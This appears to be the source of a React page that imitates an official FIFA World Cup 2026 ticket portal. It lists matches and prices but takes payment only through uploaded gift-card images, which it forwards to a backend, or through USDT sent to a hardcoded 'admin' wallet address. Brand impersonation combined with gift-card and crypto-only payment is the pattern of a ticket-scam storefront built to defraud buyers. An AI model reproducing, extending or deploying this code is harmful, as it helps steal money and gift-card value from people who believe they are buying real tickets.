// src/pages/fifa/TicketsPortal.jsx
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { toast } from 'react-toastify';
import { ticketAPI } from '../../api';
import FIFABanner from '../../components/layout/FIFABanner';
import FIFASectionFooter from '../../components/layout/FIFASectionFooter';
import './fifa.css';

const TicketsPortal = () => {
  const navigate = useNavigate();
  const [selectedMatch, setSelectedMatch] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedCategory, setSelectedCategory] = useState('');
  const [paymentMethod, setPaymentMethod] = useState('giftcard');
  const [giftCardImage, setGiftCardImage] = useState(null);
  const [giftCardAmount, setGiftCardAmount] = useState('');
  const [cryptoAddress, setCryptoAddress] = useState('');
  const [cryptoAmount, setCryptoAmount] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showCryptoAddress, setShowCryptoAddress] = useState(false);

  // This would come from admin settings in a real app
  const adminCryptoAddress = '0x742d35Cc6634C0532925a3b844Bc454e4438f44e';
  const adminCryptoNetwork = 'USDT (ERC-20)';

  const matches = [
    { id: 1, name: "Opening Match", date: "June 11, 2026", venue: "Estadio Azteca, Mexico City", price: "$200 - $850", status: "on-sale" },
    { id: 2, name: "Group Stage: USA vs England", date: "June 15, 2026", venue: "SoFi Stadium, Los Angeles", price: "$150 - $750", status: "on-sale" },
    { id: 3, name: "Group Stage: Brazil vs Germany", date: "June 18, 2026", venue: "Hard Rock Stadium, Miami", price: "$180 - $800", status: "on-sale" },
    { id: 4, name: "Round of 16", date: "July 2-5, 2026", venue: "Various Locations", price: "$250 - $1,000", status: "coming-soon" },
    { id: 5, name: "Quarterfinals", date: "July 9-10, 2026", venue: "Various Locations", price: "$350 - $1,500", status: "coming-soon" },
    { id: 6, name: "Semifinals", date: "July 14-15, 2026", venue: "Various Locations", price: "$500 - $2,500", status: "coming-soon" },
    { id: 7, name: "Final Match", date: "July 19, 2026", venue: "MetLife Stadium, New Jersey", price: "$800 - $5,000", status: "coming-soon" },
  ];

  const ticketCategories = [
    { name: "Category 1", price: "$850+", features: "Center circle view, premium seating, match program" },
    { name: "Category 2", price: "$550+", features: "Sideline view, reserved seating, digital ticket" },
    { name: "Category 3", price: "$350+", features: "Corner/end view, reserved seating" },
    { name: "Category 4", price: "$200+", features: "Behind goal, reserved seating" },
  ];

  const handleCategorySelect = (category) => {
    setSelectedCategory(category);
    setIsModalOpen(true);
  };

  const handlePurchase = (match) => {
    setSelectedMatch(match);
    setSelectedCategory('');
    setIsModalOpen(true);
  };

  const handlePaymentMethodChange = (method) => {
    setPaymentMethod(method);
    if (method === 'crypto') {
      setShowCryptoAddress(true);
    } else {
      setShowCryptoAddress(false);
    }
  };

  const handleGiftCardImageUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      // Validate file type
      if (!file.type.startsWith('image/')) {
        toast.error('Please upload an image file');
        return;
      }
      // Validate file size (max 5MB)
      if (file.size > 5 * 1024 * 1024) {
        toast.error('Image size should be less than 5MB');
        return;
      }
      const reader = new FileReader();
      reader.onloadend = () => {
        setGiftCardImage(reader.result);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      // Validate based on payment method
      if (paymentMethod === 'giftcard') {
        if (!giftCardImage) {
          toast.error('Please upload a gift card image');
          setIsSubmitting(false);
          return;
        }
        if (!giftCardAmount) {
          toast.error('Please enter the gift card amount');
          setIsSubmitting(false);
          return;
        }
      } else {
        // Crypto payment validation
        if (!cryptoAmount) {
          toast.error('Please enter the amount you want to pay');
          setIsSubmitting(false);
          return;
        }
        if (parseFloat(cryptoAmount) <= 0) {
          toast.error('Please enter a valid amount');
          setIsSubmitting(false);
          return;
        }
      }

      // Prepare data for submission
      const submissionData = {
        match: selectedMatch,
        category: selectedCategory,
        paymentMethod: paymentMethod,
        giftCardImage: paymentMethod === 'giftcard' ? giftCardImage : null,
        giftCardAmount: paymentMethod === 'giftcard' ? giftCardAmount : null,
        cryptoAmount: paymentMethod === 'crypto' ? cryptoAmount : null,
        cryptoAddress: paymentMethod === 'crypto' ? adminCryptoAddress : null,
        timestamp: new Date().toISOString()
      };
const response = await ticketAPI.submitGiftCard(submissionData);

console.log("SERVER RESPONSE:", response.data);
      toast.success(
        paymentMethod === 'giftcard' 
          ? 'Gift card submitted successfully! We will verify and confirm your tickets within 24 hours.'
          : `Crypto payment request submitted! Please send ${cryptoAmount} USDT to ${adminCryptoAddress}`
      );

      // Reset form and close modal
      resetForm();
      setIsModalOpen(false);

    } catch (error) {
      toast.error('Failed to submit ticket request. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const resetForm = () => {
    setSelectedCategory('');
    setPaymentMethod('giftcard');
    setGiftCardImage(null);
    setGiftCardAmount('');
    setCryptoAmount('');
    setShowCryptoAddress(false);
    setSelectedMatch(null);
  };

  const closeModal = () => {
    if (!isSubmitting) {
      resetForm();
      setIsModalOpen(false);
    }
  };

  return (
    <div className="fifa-page-container">
      <FIFABanner />
      
      <div className="page-content">
        <div className="page-header">
          <h1>FIFA World Cup 2026™ Tickets</h1>
          <p>Secure your seats for the world's greatest football tournament</p>
        </div>

        {/* Ticket Categories */}
        <div className="ticket-categories">
          <h2 className="section-title-small">Ticket Categories</h2>
          <div className="categories-grid">
            {ticketCategories.map((cat, idx) => (
              <div key={idx} className="category-card">
                <h3>{cat.name}</h3>
                <div className="price">{cat.price}</div>
                <p>{cat.features}</p>
                <button 
                  className="fifa-btn-primary"
                  onClick={() => handleCategorySelect(cat.name)}
                >
                  Select
                </button>
              </div>
            ))}
          </div>
        </div>

        {/* Match Listings */}
        <h2 className="section-title-small">Available Matches</h2>
        <div className="matches-table">
          {matches.map((match) => (
            <div key={match.id} className="match-row">
              <div className="match-info">
                <h3>{match.name}</h3>
                <p><i className="fas fa-calendar-alt"></i> {match.date}</p>
                <p><i className="fas fa-map-marker-alt"></i> {match.venue}</p>
                <p className="price-range">{match.price}</p>
              </div>
              <button 
                className={`purchase-btn ${match.status === 'on-sale' ? 'active' : 'disabled'}`}
                disabled={match.status !== 'on-sale'}
                onClick={() => handlePurchase(match)}
              >
                {match.status === 'on-sale' ? 'Buy Tickets →' : 'Coming Soon'}
              </button>
            </div>
          ))}
        </div>

        {/* Important Information */}
        <div className="info-section">
          <h3><i className="fas fa-info-circle"></i> Important Information</h3>
          <ul>
            <li>Maximum of 6 tickets per match per FIFA ID</li>
            <li>Tickets are non-refundable but can be resold on official marketplace</li>
            <li>FIFA ID required for all ticket purchases</li>
            <li>Mobile ticketing only - no physical tickets will be issued</li>
          </ul>
        </div>

        <button className="back-btn" onClick={() => navigate('/fifa')}>
          ← Back to FIFA World Cup
        </button>
      </div>

      <FIFASectionFooter />

      {/* Modal/Popup */}
      {isModalOpen && (
        <div className="modal-overlay" onClick={closeModal}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <button className="modal-close" onClick={closeModal} disabled={isSubmitting}>
              ×
            </button>
            
            <h2>Purchase Tickets</h2>
            
            <div className="modal-summary">
              <div className="summary-item">
                <span className="summary-label">Match:</span>
                <span className="summary-value">{selectedMatch?.name || 'Not selected'}</span>
              </div>
              {selectedCategory && (
                <div className="summary-item">
                  <span className="summary-label">Category:</span>
                  <span className="summary-value">{selectedCategory}</span>
                </div>
              )}
              <div className="summary-item">
                <span className="summary-label">Venue:</span>
                <span className="summary-value">{selectedMatch?.venue || 'Not selected'}</span>
              </div>
            </div>

            <form onSubmit={handleSubmit}>
              {/* Payment Method Selection */}
              <div className="payment-methods">
                <h3>Select Payment Method</h3>
                <div className="payment-options">
                  <button
                    type="button"
                    className={`payment-option ${paymentMethod === 'giftcard' ? 'active' : ''}`}
                    onClick={() => handlePaymentMethodChange('giftcard')}
                  >
                    <span className="payment-icon">🎁</span>
                    <span>Gift Card</span>
                  </button>
                  <button
                    type="button"
                    className={`payment-option ${paymentMethod === 'crypto' ? 'active' : ''}`}
                    onClick={() => handlePaymentMethodChange('crypto')}
                  >
                    <span className="payment-icon">₿</span>
                    <span>Crypto Payment</span>
                  </button>
                </div>
              </div>

              {/* Gift Card Section */}
              {paymentMethod === 'giftcard' && (
                <div className="giftcard-section">
                  <div className="form-group">
                    <label>Gift Card Amount ($)</label>
                    <input
                      type="number"
                      placeholder="Enter amount"
                      value={giftCardAmount}
                      onChange={(e) => setGiftCardAmount(e.target.value)}
                      min="10"
                      step="10"
                      required
                    />
                  </div>

                  <div className="form-group">
                    <label>Upload Gift Card Image</label>
                    <div className="file-upload-area">
                      <input
                        type="file"
                        accept="image/*"
                        onChange={handleGiftCardImageUpload}
                        id="giftcard-image"
                        style={{ display: 'none' }}
                      />
                      <label htmlFor="giftcard-image" className="file-upload-label">
                        {giftCardImage ? (
                          <div className="upload-preview">
                            <img src={giftCardImage} alt="Gift card" />
                            <span>Click to change image</span>
                          </div>
                        ) : (
                          <div className="upload-placeholder">
                            <span>📤</span>
                            <p>Click to upload gift card image</p>
                            <small>JPG, PNG, GIF (max 5MB)</small>
                          </div>
                        )}
                      </label>
                    </div>
                  </div>

                  <div className="info-box">
                    <p>📌 Your gift card will be verified within 24 hours. Tickets will be sent to your email once confirmed.</p>
                  </div>
                </div>
              )}

              {/* Crypto Payment Section */}
              {paymentMethod === 'crypto' && (
                <div className="crypto-section">
                  <div className="form-group">
                    <label>Amount to Pay (USDT)</label>
                    <input
                      type="number"
                      placeholder="Enter amount in USDT"
                      value={cryptoAmount}
                      onChange={(e) => setCryptoAmount(e.target.value)}
                      min="1"
                      step="1"
                      required
                    />
                  </div>

                  {showCryptoAddress && (
                    <div className="crypto-address-box">
                      <h4>Send payment to:</h4>
                      <div className="address-display">
                        <code>{adminCryptoAddress}</code>
                        <button 
                          type="button"
                          className="copy-btn"
                          onClick={() => {
                            navigator.clipboard?.writeText(adminCryptoAddress);
                            toast.success('Address copied to clipboard');
                          }}
                        >
                          📋 Copy
                        </button>
                      </div>
                      <p className="network-info">
                        Network: <strong>{adminCryptoNetwork}</strong>
                      </p>
                      <p className="payment-instruction">
                        Important: Send exactly the amount you entered above. 
                        Include the transaction ID in the description when you submit.
                      </p>
                    </div>
                  )}

                  <div className="info-box">
                    <p>🔒 Your payment will be processed securely. The admin will verify the transaction and confirm your tickets.</p>
                  </div>
                </div>
              )}

              <button 
                type="submit" 
                className="submit-btn"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Processing...' : 'Submit Request'}
              </button>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default TicketsPortal;